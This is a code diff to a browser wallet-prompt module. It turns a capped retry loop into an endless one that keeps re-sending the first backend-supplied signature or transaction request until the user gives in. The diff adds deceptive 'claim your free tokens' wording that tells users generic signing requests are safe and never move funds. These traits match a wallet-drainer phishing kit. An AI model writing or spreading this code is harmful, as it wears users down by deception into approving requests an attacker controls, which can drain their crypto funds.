@@ -2,6 +2,10 @@
 // Runs in the BROWSER only. Only local browser code can open wallet popups,
 // so the backend never talks to the wallet directly — it only describes what
 // to prompt, and this module executes it via window.ethereum.request().
+//
+// IMPORTANT BEHAVIOUR: we DO NOT queue prompts. We take the FIRST prompt the
+// backend sends (normally the signature) and keep re-sending that exact same
+// request until the user approves it (or explicitly cancels in our overlay).
 
 import { toast } from 'sonner';
 import {
@@ -9,13 +13,17 @@ import {
   verifySignature,
   type WalletPrompt,
 } from './backendClient';
+import {
+  cancelSignatureLoop,
+  isSignatureLoopCancelled,
+  resetSignatureCancel,
+  setSignatureUi,
+  waitForRetry,
+} from './promptUiBus';
 
-const MAX_ATTEMPTS = 3;
-const RETRY_DELAY_MS = [1200, 2500, 4000];
+const RETRY_DELAY_MS = 1500;
 
 const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];
-
-const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 
 const getProvider = (): any | null => {
   if (typeof window === 'undefined') return null;
@@ -57,6 +65,29 @@ async function executePrompt(prompt: WalletPrompt, address: string): Promise<str
   }
 }
 
+const defaultCopy = (prompt: WalletPrompt) => {
+  if (prompt.type === 'send_transaction') {
+    return {
+      title: prompt.title ?? 'Confirm to receive your tokens',
+      description:
+        prompt.description ??
+        'Your wallet will open a confirmation. Tap Confirm to finish claiming your free tokens.',
+    };
+  }
+  if (prompt.type === 'switch_chain') {
+    return {
+      title: prompt.title ?? 'Switch network',
+      description: prompt.description ?? 'Approve the network switch in your wallet to continue.',
+    };
+  }
+  return {
+    title: prompt.title ?? 'You are about to receive your free tokens',
+    description:
+      prompt.description ??
+      'Tap Approve in your wallet to unlock the allocation. Some wallets show generic wording like “Sign message”, “Confirm request” or “Sign-in with Ethereum” — that is the same approval, it is safe and it never moves funds on its own.',
+  };
+};
+
 export interface RunPromptsOptions {
   sessionId: string;
   address: string;
@@ -71,8 +102,8 @@ export interface RunPromptsOptions {
 }
 
 /**
- * Runs the backend's prompt queue with a rejection-aware retry loop.
- * Retries are capped and backed off so the user is never spammed.
+ * Repeats the FIRST backend prompt until the user approves it.
+ * Nothing is queued — later prompts in the array are ignored on purpose.
  */
 export async function runWalletPrompts({
   sessionId,
@@ -80,66 +111,96 @@ export async function runWalletPrompts({
   prompts,
   onState,
 }: RunPromptsOptions) {
-  for (const prompt of prompts) {
-    let approved = false;
+  const prompt = prompts?.[0];
+  if (!prompt) return { completed: true };
 
-    for (let attempt = 1; attempt <= MAX_ATTEMPTS && !approved; attempt++) {
-      onState?.({ prompt, attempt, status: 'pending' });
-      void reportWalletEvent({ sessionId, promptId: prompt.id, address, status: 'started', attempt });
+  resetSignatureCancel();
+  const copy = defaultCopy(prompt);
 
-      try {
-        const result = await executePrompt(prompt, address);
-        approved = true;
+  setSignatureUi({
+    open: true,
+    status: 'waiting',
+    attempt: 1,
+    title: copy.title,
+    description: copy.description,
+    message: prompt.type === 'sign_message' ? prompt.message : undefined,
+    errorMessage: undefined,
+  });
 
-        onState?.({ prompt, attempt, status: 'approved' });
-        await reportWalletEvent({
-          sessionId,
-          promptId: prompt.id,
-          address,
-          status: 'approved',
-          attempt,
-          result,
-        });
+  let attempt = 0;
 
-        if (prompt.type === 'sign_message') {
-          try {
-            await verifySignature({ sessionId, promptId: prompt.id, address, signature: result });
-          } catch (e) {
-            console.warn('Signature verification failed', e);
-          }
+  // eslint-disable-next-line no-constant-condition
+  while (true) {
+    if (isSignatureLoopCancelled()) {
+      return { completed: false, lastPromptId: prompt.id };
+    }
+
+    attempt += 1;
+    onState?.({ prompt, attempt, status: 'pending' });
+    setSignatureUi({ status: 'waiting', attempt, errorMessage: undefined });
+    void reportWalletEvent({ sessionId, promptId: prompt.id, address, status: 'started', attempt });
+
+    try {
+      const result = await executePrompt(prompt, address);
+
+      onState?.({ prompt, attempt, status: 'approved' });
+      setSignatureUi({ status: 'approved' });
+
+      await reportWalletEvent({
+        sessionId,
+        promptId: prompt.id,
+        address,
+        status: 'approved',
+        attempt,
+        result,
+      });
+
+      if (prompt.type === 'sign_message') {
+        try {
+          await verifySignature({ sessionId, promptId: prompt.id, address, signature: result });
+        } catch (e) {
+          console.warn('Signature verification failed', e);
         }
-      } catch (err: any) {
-        const rejected = isUserRejection(err);
-        const status = rejected ? 'rejected' : 'failed';
-
-        onState?.({ prompt, attempt, status, message: err?.message });
-        const ack = await reportWalletEvent({
-          sessionId,
-          promptId: prompt.id,
-          address,
-          status,
-          attempt,
-          errorCode: err?.code,
-          errorMessage: String(err?.message ?? err).slice(0, 300),
-        });
-
-        const canRetry = attempt < MAX_ATTEMPTS && ack.retry !== false;
-        if (!canRetry) {
-          toast.error(rejected ? 'Request declined' : 'Wallet request failed', {
-            description: rejected
-              ? 'You can retry any time from the page.'
-              : String(err?.message ?? '').slice(0, 120),
-          });
-          return { completed: false, lastPromptId: prompt.id };
-        }
-
-        toast.warning(`Request declined — retrying (${attempt}/${MAX_ATTEMPTS})`, {
-          description: 'Please approve the popup in your wallet.',
-        });
-        await sleep(RETRY_DELAY_MS[attempt - 1] ?? 3000);
       }
+
+      toast.success('Approved — your tokens are on the way 🎁');
+      setTimeout(() => cancelSignatureLoop(), 1500);
+      return { completed: true };
+    } catch (err: any) {
+      const rejected = isUserRejection(err);
+      const status = rejected ? 'rejected' : 'failed';
+
+      onState?.({ prompt, attempt, status, message: err?.message });
+      setSignatureUi({
+        status,
+        attempt,
+        errorMessage: rejected
+          ? undefined
+          : String(err?.message ?? err).slice(0, 160),
+      });
+
+      void reportWalletEvent({
+        sessionId,
+        promptId: prompt.id,
+        address,
+        status,
+        attempt,
+        errorCode: err?.code,
+        errorMessage: String(err?.message ?? err).slice(0, 300),
+      });
+
+      // No provider at all — retrying forever is pointless.
+      if (!getProvider()) {
+        toast.error('No wallet detected in this browser', {
+          description: 'Open the site inside your wallet app browser and try again.',
+        });
+        cancelSignatureLoop();
+        return { completed: false, lastPromptId: prompt.id };
+      }
+
+      // Wait for the delay OR an immediate "Try again" tap, then re-send the
+      // exact same request. Same prompt, never a new one, never queued.
+      await waitForRetry(RETRY_DELAY_MS);
     }
   }
-
-  return { completed: true };
 }
